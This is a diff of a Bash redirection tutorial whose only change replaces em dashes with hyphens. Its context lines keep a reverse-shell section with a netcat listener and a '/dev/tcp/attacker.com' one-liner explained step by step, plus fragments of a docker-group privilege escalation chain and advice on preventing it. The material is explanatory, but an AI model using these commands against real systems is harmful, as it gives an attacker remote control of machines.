@@ -206,9 +206,9 @@ _Note: /dev/tcp is a Bash-specific feature. It won't work in zsh, fish, or dash_
  └────────────── destination fd (default: 0)
 
 # variants
-<< 'EOF'    # quoted   — NO variable expansion (literal)
-<< EOF      # unquoted — variable expansion
-<<- EOF     # dash     — strips leading TABS (not spaces)
+<< 'EOF'    # quoted   - NO variable expansion (literal)
+<< EOF      # unquoted - variable expansion
+<<- EOF     # dash     - strips leading TABS (not spaces)
 
 # examples
 
@@ -350,11 +350,11 @@ exec 3>&-               # close fd 3
 ## Order Matters !!
 
 ```bash
-# CORRECT — stdout → file, stderr → file
+# CORRECT - stdout → file, stderr → file
 command > file 2>&1
 # reads as: stdout goes to file, THEN stderr goes to wherever stdout is (file)
 
-# WRONG — stderr → terminal, stdout → file
+# WRONG - stderr → terminal, stdout → file
 command 2>&1 > file
 # reads as: stderr goes to wherever stdout is (terminal), THEN stdout goes to file
 
@@ -506,7 +506,7 @@ exec 3>&-                       →   closes connection
 ### Usecase 2: Reverse Shell (attacker perspective)
 
 ```bash
-# attacker machine — listen for incoming connection
+# attacker machine - listen for incoming connection
 nc -lvnp 4444
 # -l  listen mode
 # -v  verbose
@@ -515,7 +515,7 @@ nc -lvnp 4444
 ```
 
 ```bash
-# victim machine — call back to attacker
+# victim machine - call back to attacker
 bash -i >& /dev/tcp/attacker.com/4444 0>&1
 #    │  │  │                           └── stdin(0) → wherever stdout(1) is going (socket)
 #    │  │  └── open TCP socket to attacker
@@ -527,7 +527,7 @@ bash -i >& /dev/tcp/attacker.com/4444 0>&1
 ```
 -i          →  interactive mode, bash behaves as if connected to a terminal
 >&          →  redirect stdout(1) AND stderr(2) to the socket
-/dev/tcp/   →  bash magic — opens a real TCP connection
+/dev/tcp/   →  bash magic - opens a real TCP connection
 0>&1        →  redirect stdin(0) to wherever stdout(1) is (the socket)
 ```
 
@@ -550,14 +550,14 @@ bash -i >& /dev/tcp/attacker.com/4444
 # stdout → socket  attacker sees output
 # stderr → socket  attacker sees errors
 # stdin  → ???     !!! still reading from victim's keyboard, not attacker
-# result: attacker can see output but cannot send commands — useless
+# result: attacker can see output but cannot send commands - useless
 
 # with 0>&1
 bash -i >& /dev/tcp/attacker.com/4444 0>&1
 # stdout → socket  attacker sees output
 # stderr → socket  attacker sees errors
 # stdin  → socket  attacker sends commands
-# result: full interactive shell — attacker has complete control
+# result: full interactive shell - attacker has complete control
 ```
 
 ---
@@ -590,7 +590,7 @@ docker run -v /:/mnt --rm ubuntu bash -c \
 # │ │ └─────── day of month (1-31)
 # │ └──────────hour (0-23)
 # └────────────minute (0-59)
-# * = every — so this fires every single minute
+# * = every - so this fires every single minute
 ```
 
 **The full attack chain combined:**
@@ -629,7 +629,7 @@ netstat -tnp
 
 **How to prevent it:**
 ```bash
-# don't put users in docker group — use rootless docker instead
+# don't put users in docker group - use rootless docker instead
 dockerd-rootless-setuptool.sh install
 
 # or restrict docker socket permissions
